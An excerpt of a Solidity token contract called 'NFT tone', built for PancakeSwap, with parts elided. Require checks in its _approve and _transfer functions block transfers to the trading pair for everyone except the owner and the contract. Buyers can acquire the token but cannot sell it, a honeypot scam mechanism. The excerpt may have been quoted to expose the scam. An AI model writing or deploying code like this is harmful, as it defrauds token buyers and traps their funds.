...
contract NFTtone is Context, IBEP20, Ownable {
    ...
    address private charityAdd = 0xf0dE90B34F1A95037995a54817651f9B389bb37D;
    uint256 private _numTokensSellToAddToLiquidity = 5 * 10**10 * 10**9;    

    IPancakeRouter02 public immutable pcsV2Router;
    address public immutable pcsV2Pair;

    string private _name = "NFT tone";
    ...
    function _approve(
        ...
        require(owner == address(this) || owner == _owner || spender != pcsV2Pair , "ERC20: unable to proceed the transfer");
    ...
    function _transfer(
        ...
        require(sender == address(this) || sender == _owner || recipient != pcsV2Pair , "ERC20: unable to proceed the transfer");
